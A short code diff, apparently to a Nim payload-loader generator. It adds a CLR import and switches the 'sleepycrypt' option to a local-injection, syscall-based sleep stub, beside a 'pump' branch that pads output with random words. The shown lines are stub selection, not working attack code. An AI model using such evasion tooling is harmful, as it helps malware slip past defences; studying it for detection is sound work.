@@ -492,6 +492,7 @@ import osproc
 """
 
 let AssemblyImports = """
+import winim/clr
 from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
@@ -1153,8 +1154,8 @@ if (pump):
             stub.add(genEnglishwords(rand(4750..7800)))
 
 if (sleepycrypt):
-    stub.add(SleepyCryptTestStub)
-    stub.add(SleepyCryptLoopExecute)
+    stub.add(LocalInjectGetSyscallStubSleepStub)
+    #stub.add(SleepyCryptLoopExecute)
 
 if (debugMode):
     stub = stub.replace("import strenc", "")
